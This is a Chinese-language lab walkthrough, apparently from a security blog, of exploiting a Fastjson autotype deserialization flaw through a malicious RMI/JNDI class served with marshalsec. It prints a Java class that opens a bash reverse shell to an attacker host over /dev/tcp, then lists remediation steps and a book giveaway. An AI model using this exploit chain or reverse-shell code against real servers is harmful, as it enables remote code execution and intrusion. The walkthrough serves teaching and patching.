> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lRyU_Qf1FhpzMH9TGqRnhQ)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHEwwQwobuPPhCtO42vwKXiarNLnic8vJErUXfpw5vmxdLztGSKJgUoDew/640?wx_fmt=png)

利用前提: fastjson <=1.2.68, 打开了 autotype

*   **搭建环境**
    ========
    

使用 vul-hub 搭建漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHxwpOLUfApT0Ro3ULAjyE2obOZrbaZwMfphZPg7EnT7HqiaSVKuXcIqA/640?wx_fmt=png)

访问搭好的环境看到 json 数据就表示搭建成功

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHfX3HCfLomdlykvglYibqAA2k78yDdkCGtdvY4rxTzA61CicyicNTnTtNQ/640?wx_fmt=png)

*   **搭建攻击方 web 环境  
    **
    ===================
    

假设攻击机为 A   被攻击机为 B

在 A 上搭好 web 服务和 rmi 服务, 并且能够让 B 访问主机 A

恶意类如下, 在 / tmp 下创建 success 文件夹

```
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
   static {
       try {
           Runtime rt = Runtime.getRuntime();
           String[] commands = {"touch","/tmp/success"};
           Process pc = rt.exec(commands);
           pc.waitFor();
       } catch (Exception e) {
           // do nothing
       }
    }
}
```

编译好 class 文件后搭建 rmi 服务

*   **搭建攻击方 RMI 服务  
    **
    ===================
    

搭建 rmi 服务需要用到 marshalsec

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.RMIRefServer"http://192.168.204.1/fastjson/#TouchFile" 9999
```

注: 恶意类的 class 文件前要加 #, 而且不需要加文件后缀

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHfUADckmBUeicdzWau4oibj2I26Aia1xS7qoShkMBJMMicq0pcUU35sEAicw/640?wx_fmt=png)

*   **构造恶意请求  
    **
    =============
    

注意红色框重点  RMI 服务后面跟 A 主机开放的域名 (ip): 端口 / 恶意类名称

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHaFkKZVFBTaIISeduth1dFRgub157ZlkH0rialqEfGhzybXLcOTuVH2g/640?wx_fmt=png)

发送恶意请求后, rmi 监听的口会收到 B 主机的连接并读取恶意类, 如果没有监听到就代表失败了

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHeUFnJib290flK5Yxboh1RtIrAQ17Ubn3iatuobmejYqrBN5jHxsTgnkg/640?wx_fmt=png)

响应包如下

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHqzMQZoArfwUvpBGBfHAVbKEnRib0Z1iaKU6IvJoD9KNTJ33Ibn0oT8gQ/640?wx_fmt=png)

*   **查看命令是否被执行  
    **
    ================
    

使用 docker ps

和 docker exec -it (镜像 id) /bin/bash 进入 docker 搭建好的虚拟机内

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPH6QT526MjQ8QymGE1XjxBD4rU0ZaLMpNAGdehiablkM7aLxibgZ3L7aLg/640?wx_fmt=png)

发现 / tmp/success 创建成功 代表恶意类中的代码被成功执行

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPH2TCGzc4Z2rtkMlcIv1icmXsdiaLUmKCN41zPMFIfVMOoDGk4O8tznCIQ/640?wx_fmt=png)

*   **反弹 shell  
    **
    ===============
    

构建恶意类

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPH5FnbgnfdXb4Df8a3o5m2RJkL9qfh8Tp1lV0QiaudesS6k9FIAhU6cbA/640?wx_fmt=png)

代码如下:

```
import java.lang.Runtime;
import java.lang.Process;

public class ReConn{
   static {
       try {
           Runtime rt = Runtime.getRuntime();
           String[] commands = {"/bin/bash","-c","bash -i>& /dev/tcp/192.168.204.1/7888 0>&1"};
           Process pc = rt.exec(commands);
           pc.waitFor();
       } catch (Exception e) {
           // do nothing
       }
    }
}
```

使用 nc 监听 7888 端口

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHWHOufjk1pJx398icj5kl8lSJGbk0xib02evEXjMt5D4v9IaKPgf7St8A/640?wx_fmt=png)

开启 RMI 服务

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHwLoUib61Iwk5gZvicsMsU36PCAbj2jqAlBMvk0DHW4ribVlWicDfKbKrSA/640?wx_fmt=png)

恶意请求

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHMSPX6AcJXvhfR0mBqYICUhjcK9MSIxkcbfXTAsHVtW7FauoDxSkTFA/640?wx_fmt=png)

结果

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHL0rpMcKOf6JbO16jvrOXC0UWwsSHozibe0CUzJNZhBTHmQScfnJPt3Q/640?wx_fmt=png)

*   **批量检测工具 fastjson scan**
    ========================
    

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHTjWV1kRqT60ufZw2dbjWojnm0e1icyWaVZ0zY2fgdcgQTG8kY1NzQtw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHzPorJWXtaTzL1huicsHTevsfUzd1MhrrspK8v2iaBfQcTItsxm9WKusw/640?wx_fmt=png)

*   **修复建议**
    ========
    

    1、升级 Fastjson 到最新版 (>=1.2.68 新增了 safemode, 彻底关闭 autotype)；

    2、WAF 拦截过滤请求包中的 

@type、%u0040%u0074%u0079%u0070%u0065, \u0040type,

\x04type 等多种编码的 autotype 变形；

    3、最少升级到 1.2.48 以上版本且关闭 autotype 选项；升级对应 JDK 版本到 8u191/7u201/6u211/11.0.1 以上。

1.《从实践中学习 TCP/IP 协议》

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtdrAu2oiamWGKYAvGMyNQrBLA9vGibTsgcA98M5tTgMDzyUn3HBP2jHZ9gaFVSaeia8nAHx3d3a4VicQ/640?wx_fmt=png)

从理论、应用和实践三个维度讲 TCP/IP；通过 96 个实例带你从实践中学习；结合 Wireshark 和 netwox 工具讲解；详解 ARP、DHCP、DNS、SNMP、Telnet 和 WHOIS 等协议。

**活动详情**

为了感谢一直关注我们 Khan 安全攻防实验室的粉丝们，我们将送出由机械工业出版社赞助的信息安全图书（任选其中一本）

参与规则：

1. 关注 **Khan 安全攻防实验室**公众号  

2. 转发本文至朋友圈并保存至开奖时间不可设置分组（设置分组无效）点击**赞**、**在看**并加上一句祝福语说不定会增加中奖率哦。  

3. 抽奖结束凭朋友圈截图联系我  

上次抽奖的礼品，粉丝非常满意，感谢大家长久以来的支持！

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHKE4E2ianU6vs3GEQ7GicF08EQpG96Yv3sPRbqia0vMs8XkDrlkG22vK8g/640?wx_fmt=png)